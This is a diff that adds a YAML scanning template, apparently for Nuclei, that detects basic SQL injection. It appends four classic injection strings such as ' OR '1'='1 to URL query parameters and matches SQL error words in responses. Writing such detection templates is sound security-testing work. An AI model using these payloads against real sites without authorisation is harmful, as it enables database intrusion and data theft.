@@ -1,0 +1,37 @@
+id: fuzz-sqli-basic
+
+info:
+  name: Basic SQL Injection Detection
+  author: your_name
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path_fuzz}}"
+    payloads:
+      sqli:
+        - "' OR '1'='1"
+        - "' OR '1'='1'--"
+        - "' OR 1=1--"
+        - "' OR 1=1#"
+    stop-at-first-match: true
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "syntax error"
+          - "SQL error"
+          - "mysql"
+          - "sql"
+      - type: word
+        part: header
+        words:
+          - "text/html"
